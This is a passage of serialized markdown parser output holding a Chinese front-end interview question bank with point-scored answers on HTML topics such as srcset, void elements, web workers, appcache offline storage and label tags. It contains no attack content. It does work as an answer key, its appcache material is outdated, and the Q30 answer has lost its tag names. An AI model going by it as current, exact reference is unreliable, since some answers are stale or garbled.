Enhancement）是Web开发中用于提高网站或应用在不同环境和设备上的适应性的两种策略。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"优雅降级是一种设计策略，它首先构建完整的功能和复杂的用户体验，然后针对那些不支持这些功能的浏览器或设备进行简化或降级处理，以确保基本的可用性。优雅降级的特点是从一个功能丰富的版本开始，并试图通过减少功能来适应不同的环境，关注的是保持核心功能的可用性，即使在低版本浏览器或设备上。","text":"优雅降级是一种设计策略，它首先构建完整的功能和复杂的用户体验，然后针对那些不支持这些功能的浏览器或设备进行简化或降级处理，以确保基本的可用性。优雅降级的特点是从一个功能丰富的版本开始，并试图通过减少功能来适应不同的环境，关注的是保持核心功能的可用性，即使在低版本浏览器或设备上。","tokens":[{"type":"text","raw":"优雅降级是一种设计策略，它首先构建完整的功能和复杂的用户体验，然后针对那些不支持这些功能的浏览器或设备进行简化或降级处理，以确保基本的可用性。优雅降级的特点是从一个功能丰富的版本开始，并试图通过减少功能来适应不同的环境，关注的是保持核心功能的可用性，即使在低版本浏览器或设备上。","text":"优雅降级是一种设计策略，它首先构建完整的功能和复杂的用户体验，然后针对那些不支持这些功能的浏览器或设备进行简化或降级处理，以确保基本的可用性。优雅降级的特点是从一个功能丰富的版本开始，并试图通过减少功能来适应不同的环境，关注的是保持核心功能的可用性，即使在低版本浏览器或设备上。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"渐进增强则是从最基本的、可访问的版本开始构建网站或应用，然后逐渐添加更高级的功能和效果，以提供更好的用户体验。渐进增强的特点是从一个非常基础的、能够起作用的版本开始，并不断扩充，以适应未来环境的需要，关注的是为所有用户提供基本功能，并为高级用户提供额外体验。","text":"渐进增强则是从最基本的、可访问的版本开始构建网站或应用，然后逐渐添加更高级的功能和效果，以提供更好的用户体验。渐进增强的特点是从一个非常基础的、能够起作用的版本开始，并不断扩充，以适应未来环境的需要，关注的是为所有用户提供基本功能，并为高级用户提供额外体验。","tokens":[{"type":"text","raw":"渐进增强则是从最基本的、可访问的版本开始构建网站或应用，然后逐渐添加更高级的功能和效果，以提供更好的用户体验。渐进增强的特点是从一个非常基础的、能够起作用的版本开始，并不断扩充，以适应未来环境的需要，关注的是为所有用户提供基本功能，并为高级用户提供额外体验。","text":"渐进增强则是从最基本的、可访问的版本开始构建网站或应用，然后逐渐添加更高级的功能和效果，以提供更好的用户体验。渐进增强的特点是从一个非常基础的、能够起作用的版本开始，并不断扩充，以适应未来环境的需要，关注的是为所有用户提供基本功能，并为高级用户提供额外体验。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 24. img的srcset属性的作⽤？\\n\\n","depth":2,"text":"24. img的srcset属性的作⽤？","tokens":[{"type":"text","raw":"24. img的srcset属性的作⽤？","text":"24. img的srcset属性的作⽤？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"响应式页面中经常用到根据屏幕密度设置不同的图片。这时就用到了 img 标签的srcset属性。srcset属性用于设置不同屏幕密度下，img 会自动加载不同的图片。用法如下：","text":"响应式页面中经常用到根据屏幕密度设置不同的图片。这时就用到了 img 标签的srcset属性。srcset属性用于设置不同屏幕密度下，img 会自动加载不同的图片。用法如下：","tokens":[{"type":"text","raw":"响应式页面中经常用到根据屏幕密度设置不同的图片。这时就用到了 img 标签的srcset属性。srcset属性用于设置不同屏幕密度下，img 会自动加载不同的图片。用法如下：","text":"响应式页面中经常用到根据屏幕密度设置不同的图片。这时就用到了 img 标签的srcset属性。srcset属性用于设置不同屏幕密度下，img 会自动加载不同的图片。用法如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<img src=\\"image-128.png\\" srcset=\\"image-256.png 2x\\" />\\n\\n```","lang":"html","text":"<img src=\\"image-128.png\\" srcset=\\"image-256.png 2x\\" />\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 25. 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？\\n\\n","depth":2,"text":"25. 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？","tokens":[{"type":"text","raw":"25. 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？","text":"25. 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"行内元素有：a b span img input select strong；","text":"行内元素有：a b span img input select strong；","tokens":[{"type":"text","raw":"行内元素有：a b span img input select strong；","text":"行内元素有：a b span img input select strong；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"块级元素有：div ul ol li dl dt dd h1 h2 h3 h4 h5 h6 p；","text":"块级元素有：div ul ol li dl dt dd h1 h2 h3 h4 h5 h6 p；","tokens":[{"type":"text","raw":"块级元素有：div ul ol li dl dt dd h1 h2 h3 h4 h5 h6 p；","text":"块级元素有：div ul ol li dl dt dd h1 h2 h3 h4 h5 h6 p；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"空元素，即没有内容的HTML元素。空元素是在开始标签中关闭的，也就是空元素没有闭合标签：","text":"空元素，即没有内容的HTML元素。空元素是在开始标签中关闭的，也就是空元素没有闭合标签：","tokens":[{"type":"text","raw":"空元素，即没有内容的HTML元素。空元素是在开始标签中关闭的，也就是空元素没有闭合标签：","text":"空元素，即没有内容的HTML元素。空元素是在开始标签中关闭的，也就是空元素没有闭合标签：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"常见的有：br hr img input link meta","text":"常见的有：br hr img input link meta","tokens":[{"type":"text","raw":"常见的有：br hr img input link meta","text":"常见的有：br hr img input link meta","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 26. 说一下 web worker\\n\\n","depth":2,"text":"26. 说一下 web worker","tokens":[{"type":"text","raw":"26. 说一下 web worker","text":"26. 说一下 web worker","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"在 HTML 页面中，如果在执行脚本时，页面的状态是不可相应的，直到脚本执行完成后，页面才变成可相应。web worker 是运行在后台的 js，独立于其他脚本，不会影响页面的性能。 并且通过 postMessage 将结果回传到主线程。这样在进行复杂操作的时候，就不会阻塞主线程了。","text":"在 HTML 页面中，如果在执行脚本时，页面的状态是不可相应的，直到脚本执行完成后，页面才变成可相应。web worker 是运行在后台的 js，独立于其他脚本，不会影响页面的性能。 并且通过 postMessage 将结果回传到主线程。这样在进行复杂操作的时候，就不会阻塞主线程了。","tokens":[{"type":"text","raw":"在 HTML 页面中，如果在执行脚本时，页面的状态是不可相应的，直到脚本执行完成后，页面才变成可相应。web worker 是运行在后台的 js，独立于其他脚本，不会影响页面的性能。 并且通过 postMessage 将结果回传到主线程。这样在进行复杂操作的时候，就不会阻塞主线程了。","text":"在 HTML 页面中，如果在执行脚本时，页面的状态是不可相应的，直到脚本执行完成后，页面才变成可相应。web worker 是运行在后台的 js，独立于其他脚本，不会影响页面的性能。 并且通过 postMessage 将结果回传到主线程。这样在进行复杂操作的时候，就不会阻塞主线程了。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如何创建 web worker：","text":"如何创建 web worker：","tokens":[{"type":"text","raw":"如何创建 web worker：","text":"如何创建 web worker：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"检测浏览器对于 web worker 的支持性","text":"检测浏览器对于 web worker 的支持性","tokens":[{"type":"text","raw":"检测浏览器对于 web worker 的支持性","text":"检测浏览器对于 web worker 的支持性","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"创建 web worker 文件（js，回传函数等）","text":"创建 web worker 文件（js，回传函数等）","tokens":[{"type":"text","raw":"创建 web worker 文件（js，回传函数等）","text":"创建 web worker 文件（js，回传函数等）","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"创建 web worker 对象","text":"创建 web worker 对象","tokens":[{"type":"text","raw":"创建 web worker 对象","text":"创建 web worker 对象","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 27. HTML5的离线储存怎么使用，它的工作原理是什么\\n\\n","depth":2,"text":"27. HTML5的离线储存怎么使用，它的工作原理是什么","tokens":[{"type":"text","raw":"27. HTML5的离线储存怎么使用，它的工作原理是什么","text":"27. HTML5的离线储存怎么使用，它的工作原理是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"离线存储指的是：在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。","text":"离线存储指的是：在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。","tokens":[{"type":"text","raw":"离线存储指的是：在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。","text":"离线存储指的是：在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"**原理：**HTML5的离线存储是基于一个新建的 .appcache 文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示.","text":"**原理：**HTML5的离线存储是基于一个新建的 .appcache 文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示.","tokens":[{"type":"text","raw":"**原理：**HTML5的离线存储是基于一个新建的 .appcache 文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示.","text":"**原理：**HTML5的离线存储是基于一个新建的 .appcache 文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示.","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用方法： （1）创建一个和 html 同名的 manifest 文件，然后在页面头部加入 manifest 属性：","text":"使用方法： （1）创建一个和 html 同名的 manifest 文件，然后在页面头部加入 manifest 属性：","tokens":[{"type":"text","raw":"使用方法： （1）创建一个和 html 同名的 manifest 文件，然后在页面头部加入 manifest 属性：","text":"使用方法： （1）创建一个和 html 同名的 manifest 文件，然后在页面头部加入 manifest 属性：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n\\n  <html lang=\\"en\\" manifest=\\"index.manifest\\">\\n\\n```","lang":"html","text":"\\n  <html lang=\\"en\\" manifest=\\"index.manifest\\">\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（2）在 cache.manifest 文件中编写需要离线存储的资源：","text":"（2）在 cache.manifest 文件中编写需要离线存储的资源：","tokens":[{"type":"text","raw":"（2）在 cache.manifest 文件中编写需要离线存储的资源：","text":"（2）在 cache.manifest 文件中编写需要离线存储的资源：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n\\n  CACHE MANIFEST\\n    #v0.11\\n    CACHE:\\n    js/app.js\\n    css/style.css\\n    NETWORK:\\n    resourse/logo.png\\n    FALLBACK:\\n    / /offline.html\\n\\n```","lang":"html","text":"\\n  CACHE MANIFEST\\n    #v0.11\\n    CACHE:\\n    js/app.js\\n    css/style.css\\n    NETWORK:\\n    resourse/logo.png\\n    FALLBACK:\\n    / /offline.html\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"CACHE: 表示需要离线存储的资源列表，由于包含 manifest 文件的页面将被自动离线存储，所以不需要把页面自身也列出来。","text":"CACHE: 表示需要离线存储的资源列表，由于包含 manifest 文件的页面将被自动离线存储，所以不需要把页面自身也列出来。","tokens":[{"type":"text","raw":"CACHE: 表示需要离线存储的资源列表，由于包含 manifest 文件的页面将被自动离线存储，所以不需要把页面自身也列出来。","text":"CACHE: 表示需要离线存储的资源列表，由于包含 manifest 文件的页面将被自动离线存储，所以不需要把页面自身也列出来。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"NETWORK: 表示在它下面列出来的资源只有在在线的情况下才能访问，他们不会被离线存储，所以在离线情况下无法使用这些资源。不过，如果在 CACHE 和 NETWORK 中有一个相同的资源，那么这个资源还是会被离线存储，也就是说 CACHE 的优先级更高。","text":"NETWORK: 表示在它下面列出来的资源只有在在线的情况下才能访问，他们不会被离线存储，所以在离线情况下无法使用这些资源。不过，如果在 CACHE 和 NETWORK 中有一个相同的资源，那么这个资源还是会被离线存储，也就是说 CACHE 的优先级更高。","tokens":[{"type":"text","raw":"NETWORK: 表示在它下面列出来的资源只有在在线的情况下才能访问，他们不会被离线存储，所以在离线情况下无法使用这些资源。不过，如果在 CACHE 和 NETWORK 中有一个相同的资源，那么这个资源还是会被离线存储，也就是说 CACHE 的优先级更高。","text":"NETWORK: 表示在它下面列出来的资源只有在在线的情况下才能访问，他们不会被离线存储，所以在离线情况下无法使用这些资源。不过，如果在 CACHE 和 NETWORK 中有一个相同的资源，那么这个资源还是会被离线存储，也就是说 CACHE 的优先级更高。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"FALLBACK: 表示如果访问第一个资源失败，那么就使用第二个资源来替换他，比如上面这个文件表示的就是如果访问根目录下任何一个资源失败了，那么就去访问 offline.html 。","text":"FALLBACK: 表示如果访问第一个资源失败，那么就使用第二个资源来替换他，比如上面这个文件表示的就是如果访问根目录下任何一个资源失败了，那么就去访问 offline.html 。","tokens":[{"type":"text","raw":"FALLBACK: 表示如果访问第一个资源失败，那么就使用第二个资源来替换他，比如上面这个文件表示的就是如果访问根目录下任何一个资源失败了，那么就去访问 offline.html 。","text":"FALLBACK: 表示如果访问第一个资源失败，那么就使用第二个资源来替换他，比如上面这个文件表示的就是如果访问根目录下任何一个资源失败了，那么就去访问 offline.html 。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（3）在离线状态时，操作 window.applicationCache 进行离线缓存的操作。","text":"（3）在离线状态时，操作 window.applicationCache 进行离线缓存的操作。","tokens":[{"type":"text","raw":"（3）在离线状态时，操作 window.applicationCache 进行离线缓存的操作。","text":"（3）在离线状态时，操作 window.applicationCache 进行离线缓存的操作。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 28. 浏览器是如何对 HTML5 的离线储存资源进行管理和加载？\\n\\n","depth":2,"text":"28. 浏览器是如何对 HTML5 的离线储存资源进行管理和加载？","tokens":[{"type":"text","raw":"28. 浏览器是如何对 HTML5 的离线储存资源进行管理和加载？","text":"28. 浏览器是如何对 HTML5 的离线储存资源进行管理和加载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"在线的情况下，浏览器发现 html 头部有 manifest 属性，它会请求 manifest 文件，如果是第一次访问页面 ，那么浏览器就会根据 manifest 文件的内容下载相应的资源并且进行离线存储。如果已经访问过页面并且资源已经进行离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 manifest 文件与旧的 manifest 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，就会重新下载文件中的资源并进行离线存储。","text":"在线的情况下，浏览器发现 html 头部有 manifest 属性，它会请求 manifest 文件，如果是第一次访问页面 ，那么浏览器就会根据 manifest 文件的内容下载相应的资源并且进行离线存储。如果已经访问过页面并且资源已经进行离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 manifest 文件与旧的 manifest 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，就会重新下载文件中的资源并进行离线存储。","tokens":[{"type":"text","raw":"在线的情况下，浏览器发现 html 头部有 manifest 属性，它会请求 manifest 文件，如果是第一次访问页面 ，那么浏览器就会根据 manifest 文件的内容下载相应的资源并且进行离线存储。如果已经访问过页面并且资源已经进行离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 manifest 文件与旧的 manifest 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，就会重新下载文件中的资源并进行离线存储。","text":"在线的情况下，浏览器发现 html 头部有 manifest 属性，它会请求 manifest 文件，如果是第一次访问页面 ，那么浏览器就会根据 manifest 文件的内容下载相应的资源并且进行离线存储。如果已经访问过页面并且资源已经进行离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的 manifest 文件与旧的 manifest 文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，就会重新下载文件中的资源并进行离线存储。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"离线的情况下，浏览器会直接使用离线存储的资源。","text":"离线的情况下，浏览器会直接使用离线存储的资源。","tokens":[{"type":"text","raw":"离线的情况下，浏览器会直接使用离线存储的资源。","text":"离线的情况下，浏览器会直接使用离线存储的资源。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 29. label 的作用是什么？如何使用\\n\\n","depth":2,"text":"29. label 的作用是什么？如何使用","tokens":[{"type":"text","raw":"29. label 的作用是什么？如何使用","text":"29. label 的作用是什么？如何使用","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"label标签来定义表单控件的关系：当用户选择label标签时，浏览器会自动将焦点转到和label标签相关的表单控件上。","text":"label标签来定义表单控件的关系：当用户选择label标签时，浏览器会自动将焦点转到和label标签相关的表单控件上。","tokens":[{"type":"text","raw":"label标签来定义表单控件的关系：当用户选择label标签时，浏览器会自动将焦点转到和label标签相关的表单控件上。","text":"label标签来定义表单控件的关系：当用户选择label标签时，浏览器会自动将焦点转到和label标签相关的表单控件上。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n\\n<label for=\\"mobile\\">Number:</label>\\n<input type=\\"text\\" id=\\"mobile\\"/>\\n\\n```","lang":"html","text":"\\n<label for=\\"mobile\\">Number:</label>\\n<input type=\\"text\\" id=\\"mobile\\"/>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 30. head 标签有什么作用，其中什么标签必不可少？\\n\\n","depth":2,"text":"30. head 标签有什么作用，其中什么标签必不可少？","tokens":[{"type":"text","raw":"30. head 标签有什么作用，其中什么标签必不可少？","text":"30. head 标签有什么作用，其中什么标签必不可少？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"标签用于定义文档的头部，它是所有头部元素的容器。 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等。","text":"标签用于定义文档的头部，它是所有头部元素的容器。 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等。","tokens":[{"type":"text","raw":"标签用于定义文档的头部，它是所有头部元素的容器。 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等。","text":"标签用于定义文档的头部，它是所有头部元素的容器。 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"文档的头部描述了文档的各种属性和信息，包括文档的标题、在 Web 中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。","text":"文档的头部描述了文档的各种属性和信息，包括文档的标题、在 Web 中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。","tokens":[{"type":"text","raw":"文档的头部描述了文档的各种属性和信息，包括文档的标题、在 Web 中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。","text":"文档的头部描述了文档的各种属性和信息，包括文档的标题、在 Web 中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"下面这些标签可用在 head 部分：base, link 等。","text":"下面这些标签可用在 head 部分：base, link 等。","tokens":[{"type":"text","raw":"下面这些标签可用在 head 部分：base, link 等。","text":"下面这些标签可用在 head 部分：base, link 等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 31. 说一下 HTML5 drag API\\n\\n","depth":2,"text":"31. 说一下 HTML5 drag API","tokens":[{"type":"text","raw":"31. 说一下 HTML5 drag API","text":"31. 说一下 HTML5 drag API","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 